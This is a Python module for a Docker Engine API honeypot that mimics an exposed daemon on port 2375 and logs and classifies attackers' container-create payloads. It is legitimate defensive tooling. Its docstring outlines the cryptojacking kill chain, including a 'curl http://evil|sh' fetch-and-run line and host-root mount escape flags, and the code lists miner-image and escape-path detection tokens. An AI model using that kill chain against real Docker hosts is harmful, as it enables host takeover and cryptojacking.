"""
sensors.docker_sensor
======================

A medium-interaction **Docker Engine API** honeypot on port 2375.

An exposed Docker daemon (the unauthenticated TCP socket on 2375) is one of the
highest-value targets on the internet: it is effectively remote root. The big
cryptojacking botnets — Kinsing, TeamTNT, WatchDog, and friends — scan for it
around the clock. The standard kill chain is:

  GET  /version                      fingerprint the daemon
  GET  /info                         host recon (CPUs, memory → mining value)
  POST /images/create?fromImage=...  pull a malicious image (the image is an IOC)
  POST /containers/create            create a container — THE payload:
        Image      → which miner / tool         (IOC)
        Cmd/Entrypoint → "curl http://evil|sh"  (IOC URL + command)
        HostConfig.Binds ["/:/host"] → mount the host fs   (escape, T1611)
        HostConfig.Privileged / PidMode "host"  (escape, T1611)
        Env        → wallet address / C2 config (IOC)
  POST /containers/{id}/start        run it
  POST /containers/{id}/exec         exec inside it

We speak just enough of the REST API to keep those scripts moving — plausible
JSON for the read endpoints, fake-but-consistent IDs for create/start/exec — and
we capture and classify *everything*. The container-create payload is the prize:
we extract the image, command, mounts, privileged/host-namespace flags, and env,
run the command through the shared ATT&CK classifier to pull IOC URLs and
technique IDs, and flag host-escape attempts explicitly. Nothing is ever pulled,
created, or run — it's all theatre that records.
"""
from __future__ import annotations

import json
import re
import secrets
import ssl
import time
from collections import OrderedDict
from pathlib import Path

from flask import Flask, request, Response, make_response

from ..config import Config
from ..core import logger as L
from ..core.logger import EventType
from ..core.session import TRACKER
from ..core.enrichment import enrich
from ..core import threat_intel as TI
from ..core import classify as CLS

LISTEN_PORT = 2375
DOCKER_VERSION = "24.0.7"
API_VERSION = "1.43"
KERNEL = "5.15.0-91-generic"

app = Flask("nodewatch-docker")

# Strip an optional "/v1.43" style API-version prefix so we can match paths.
_VER_PREFIX_RE = re.compile(r"^/v\d+\.\d+(?:-[a-z]+)?")

# In-memory map of fake containers an attacker has "created", so a later
# start/exec can be tied back to the malicious create payload it came from.
_CONTAINERS: "OrderedDict[str, dict]" = OrderedDict()
_CONT_MAX = 10_000

# Known cryptojacking / abuse image substrings (best-effort IOC tagging).
_MINER_IMAGE_TOKENS = (
    "xmrig", "monero", "miner", "minexmr", "cpuminer", "kdevtmpfsi",
    "kinsing", "teamtnt", "watchdog", "coinhive", "nbminer", "phoenixminer",
    "cetus", "z0miner", "/pause", "alpine-xmr",
)


# ----------------------------------------------------------------- responses
def _json(obj, status=200, extra_headers=None):
    resp = make_response(json.dumps(obj), status)
    resp.headers["Content-Type"] = "application/json"
    resp.headers["Api-Version"] = API_VERSION
    resp.headers["Docker-Experimental"] = "false"
    resp.headers["Ostype"] = "linux"
    resp.headers["Server"] = f"Docker/{DOCKER_VERSION} (linux)"
    if extra_headers:
        resp.headers.update(extra_headers)
    return resp


def _fake_id() -> str:
    return secrets.token_hex(32)


def _hostname() -> str:
    try:
        return Config.load().node_name or "docker-prod-01"
    except Exception:
        return "docker-prod-01"


def _client_ip() -> str:
    return (request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0")
            .split(",")[0].strip())


def _log(event_type, data: dict) -> None:
    src_ip = _client_ip()
    try:
        L.get().emit(
            event_type,
            src_ip=src_ip,
            src_port=int(request.environ.get("REMOTE_PORT", 0) or 0),
            dst_port=LISTEN_PORT,
            session_id=TRACKER.get(src_ip),
            data=data,
        )
    except Exception:
        pass


# ----------------------------------------------------------- create analysis
def _analyze_create(body: dict) -> dict:
    """Pull the interesting, high-signal fields out of a /containers/create
    payload and classify the attack."""
    out: dict = {}
    image = body.get("Image") or ""
    cmd = body.get("Cmd")
    entry = body.get("Entrypoint")
    env = body.get("Env") or []
    hostcfg = body.get("HostConfig") or {}

    out["image"] = image[:300] if isinstance(image, str) else image
    if cmd:
        out["cmd"] = cmd if isinstance(cmd, str) else " ".join(map(str, cmd))[:1000]
    if entry:
        out["entrypoint"] = entry if isinstance(entry, str) else " ".join(map(str, entry))[:1000]
    if env:
        out["env"] = [str(e)[:200] for e in env][:32]

    binds = hostcfg.get("Binds") or []
    mounts = body.get("Mounts") or hostcfg.get("Mounts") or []
    privileged = bool(hostcfg.get("Privileged"))
    pid_mode = hostcfg.get("PidMode") or ""
    net_mode = hostcfg.get("NetworkMode") or ""
    ipc_mode = hostcfg.get("IpcMode") or ""

    techniques = {"T1610"}             # Deploy Container
    chains: list[str] = []

    # --- host-escape detection (T1611 Escape to Host) ---
    def _is_host_root_bind(b: str) -> bool:
        src = str(b).split(":")[0]
        return src in ("/", "/root", "/etc", "/var/run", "/var/run/docker.sock",
                       "/host", "/proc", "/sys")
    escape_binds = [b for b in binds if _is_host_root_bind(b)]
    if any(str(m.get("Source", "")) in ("/", "/root", "/etc") for m in mounts if isinstance(m, dict)):
        escape_binds.append("(Mounts host path)")
    if escape_binds:
        chains.append("host_filesystem_mount_escape")
        techniques.add("T1611")
        out["host_mounts"] = [str(b)[:200] for b in (binds or [])][:16]
    if privileged:
        chains.append("privileged_container_escape")
        techniques.add("T1611")
        out["privileged"] = True
    if pid_mode == "host" or ipc_mode == "host":
        chains.append("host_namespace_escape")
        techniques.add("T1611")
        out["host_namespace"] = pid_mode or ipc_mode
    if net_mode == "host":
        out["host_network"] = True

    # --- cryptominer image / nsenter escape heuristics ---
    blob = " ".join([str(image), out.get("cmd", ""), out.get("entrypoint", "")]).lower()
    if any(tok in blob for tok in _MINER_IMAGE_TOKENS):
        chains.append("cryptominer_image")
        techniques.add("T1496")        # Resource Hijacking
    if "nsenter" in blob:
        chains.append("nsenter_host_escape")
        techniques.add("T1611")

    # --- classify the container command with the shared ATT&CK classifier ---
    run_str = " ".join(filter(None, [out.get("entrypoint", ""), out.get("cmd", "")]))
    if run_str.strip():
        cls = CLS.classify_command(run_str)
        if cls.get("category"):
            out["cmd_category"] = cls["category"]
        for t in cls.get("techniques", []):
            techniques.add(t)
        iocs = cls.get("iocs") or {}
        if iocs.get("urls"):
            out["ioc_urls"] = iocs["urls"][:16]
        if iocs.get("ips"):
            out["ioc_ips"] = iocs["ips"][:16]

    # --- wallet / pool extraction from env + cmd (IOC) ---
    wallets = re.findall(r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b", blob)  # Monero addr
    if wallets:
        out["monero_wallets"] = list(dict.fromkeys(wallets))[:8]
        chains.append("cryptominer_image")
        techniques.add("T1496")
    pools = re.findall(r"\b(?:stratum\+tcp|pool)[^\s'\"]*", blob)
    if pools:
        out["mining_pools"] = list(dict.fromkeys(pools))[:8]

    out["attack_chains"] = list(dict.fromkeys(chains))
    out["techniques"] = sorted(techniques)
    return out


def _register_container(cid: str, analysis: dict) -> None:
    try:
        _CONTAINERS[cid] = {"created_at": time.time(), **analysis}
        _CONTAINERS.move_to_end(cid)
        while len(_CONTAINERS) > _CONT_MAX:
            _CONTAINERS.popitem(last=False)
    except Exception:
        pass


# --------------------------------------------------------------- dispatcher
@app.route("/", defaults={"rest": ""},
           methods=["GET", "POST", "PUT", "DELETE", "HEAD"])
@app.route("/<path:rest>",
           methods=["GET", "POST", "PUT", "DELETE", "HEAD"])
def _dispatch(rest):
    raw_path = "/" + rest
    path = _VER_PREFIX_RE.sub("", raw_path) or "/"
    src_ip = _client_ip()
    geo = enrich(src_ip)

    # Log every API hit with attacker intel.
    _log(EventType.DOCKER_API, {
        "method": request.method,
        "path": raw_path[:300],
        "query": request.query_string.decode("latin-1", "replace")[:300],
        "user_agent": request.headers.get("User-Agent", "")[:300],
        "geo": geo,
        "intel": TI.tag_event(src_ip, geo,
                              user_agent=request.headers.get("User-Agent", "")),
    })

    m = request.method
    # ---- fingerprint / ping ----
    if path in ("/_ping", "/v1.24/_ping") and m in ("GET", "HEAD"):
        return make_response("OK", 200, {
            "Api-Version": API_VERSION, "Server": f"Docker/{DOCKER_VERSION} (linux)",
            "Docker-Experimental": "false", "Content-Type": "text/plain; charset=utf-8"})

    if path == "/version":
        return _json({
            "Version": DOCKER_VERSION, "ApiVersion": API_VERSION,
            "MinAPIVersion": "1.12", "GitCommit": "311b9ff",
            "GoVersion": "go1.20.10", "Os": "linux", "Arch": "amd64",
            "KernelVersion": KERNEL, "BuildTime": "2023-10-26T09:08:20.000000000+00:00",
            "Components": [{"Name": "Engine", "Version": DOCKER_VERSION}],
        })

    if path == "/info":
        return _json({
            "ID": "7e3f:" + secrets.token_hex(8), "Containers": 3,
            "ContainersRunning": 2, "ContainersPaused": 0, "ContainersStopped": 1,
            "Images": 14, "Driver": "overlay2", "ServerVersion": DOCKER_VERSION,
            "KernelVersion": KERNEL, "OperatingSystem": "Ubuntu 22.04.3 LTS",
            "OSType": "linux", "Architecture": "x86_64", "NCPU": 8,
            "MemTotal": 16_750_000_000, "Name": _hostname(),
            "DockerRootDir": "/var/lib/docker", "Swarm": {"LocalNodeState": "inactive"},
            "SecurityOptions": ["name=seccomp,profile=builtin"],
        })

    # ---- recon: list images / containers ----
    if path == "/images/json":
        return _json([
            {"Id": "sha256:" + secrets.token_hex(32),
             "RepoTags": ["ubuntu:22.04"], "Size": 77_800_000},
            {"Id": "sha256:" + secrets.token_hex(32),
             "RepoTags": ["nginx:latest"], "Size": 142_000_000},
        ])
    if path == "/containers/json":
        return _json([
            {"Id": secrets.token_hex(32), "Names": ["/app_web_1"],
             "Image": "nginx:latest", "State": "running", "Status": "Up 3 days"},
        ])

    # ---- image pull (often the malicious image) ----
    if path == "/images/create" and m == "POST":
        from_image = request.args.get("fromImage", "")
        tag = request.args.get("tag", "latest")
        ref = f"{from_image}:{tag}" if from_image else ""
        is_miner = any(tok in ref.lower() for tok in _MINER_IMAGE_TOKENS)
        _log(EventType.DOCKER_API, {
            "event": "image_pull", "image": ref[:300],
            "suspicious_image": is_miner,
            "techniques": (["T1496", "T1610"] if is_miner else ["T1610"]),
            "geo": geo,
        })
        # Stream a believable (fake) pull progress, ending in success.
        body = (json.dumps({"status": f"Pulling from library/{from_image}"}) + "\r\n"
                + json.dumps({"status": "Pulling fs layer", "id": secrets.token_hex(6)}) + "\r\n"
                + json.dumps({"status": "Download complete", "id": secrets.token_hex(6)}) + "\r\n"
                + json.dumps({"status": f"Status: Downloaded newer image for {ref}"}) + "\r\n")
        return Response(body, status=200, mimetype="application/json")

    # ---- container create: THE payload ----
    if path == "/containers/create" and m == "POST":
        try:
            body = request.get_json(force=True, silent=True) or {}
        except Exception:
            body = {}
        analysis = _analyze_create(body) if isinstance(body, dict) else {}
        cid = _fake_id()
        _register_container(cid, analysis)
        # Keep the raw payload (truncated) for forensics.
        try:
            raw = request.get_data(cache=True)[:16384].decode("utf-8", "replace")
        except Exception:
            raw = ""
        _log(EventType.DOCKER_CONTAINER_CREATE, {
            "container_id": cid[:12], "name": request.args.get("name", ""),
            "geo": geo, "raw_payload": raw, **analysis,
        })
        return _json({"Id": cid, "Warnings": []}, status=201)

    # ---- start / exec a previously-created container ----
    mstart = re.match(r"^/containers/([0-9a-fA-F]+)/(start|restart)$", path)
    if mstart and m == "POST":
        cid = mstart.group(1)
        prior = next((v for k, v in _CONTAINERS.items() if k.startswith(cid)), {})
        _log(EventType.DOCKER_API, {
            "event": "container_start", "container_id": cid[:12],
            "image": prior.get("image"), "attack_chains": prior.get("attack_chains"),
            "techniques": prior.get("techniques", ["T1610"]), "geo": geo,
        })
        return make_response("", 204)

    mexec = re.match(r"^/containers/([0-9a-fA-F]+)/exec$", path)
    if mexec and m == "POST":
        try:
            body = request.get_json(force=True, silent=True) or {}
        except Exception:
            body = {}
        ecmd = body.get("Cmd") or []
        run_str = " ".join(map(str, ecmd)) if isinstance(ecmd, list) else str(ecmd)
        cls = CLS.classify_command(run_str) if run_str.strip() else {}
        eid = _fake_id()
        _log(EventType.DOCKER_API, {
            "event": "exec_create", "container_id": mexec.group(1)[:12],
            "exec_cmd": run_str[:1000], "cmd_category": cls.get("category"),
            "techniques": list({"T1610", "T1059", *cls.get("techniques", [])}),
            "ioc_urls": (cls.get("iocs") or {}).get("urls", [])[:16], "geo": geo,
        })
        return _json({"Id": eid}, status=201)

    mexstart = re.match(r"^/exec/([0-9a-fA-F]+)/start$", path)
    if mexstart and m == "POST":
        # Attacker streams the exec; return an empty hijacked stream.
        return Response(b"", status=200,
                        mimetype="application/vnd.docker.raw-stream")

    # ---- default: behave like an API that didn't recognize the route ----
    return _json({"message": f"page not found"}, status=404)


# ------------------------------------------------------------------- serve
def serve(host: str = "0.0.0.0", port: int = LISTEN_PORT) -> None:
    cfg = Config.load()
    L.configure(cfg.log_dir, cfg.node_name, "docker")
    L.get().emit(EventType.NODE_START, src_ip="0.0.0.0",
                 data={"role": "docker_sensor", "port": port,
                       "docker_version": DOCKER_VERSION})
    from werkzeug.serving import make_server
    from ..core.http_stealth import StealthWSGIRequestHandler
    s = make_server(host, port, app, threaded=True,
                    request_handler=StealthWSGIRequestHandler)
    s.serve_forever()


if __name__ == "__main__":
    serve()
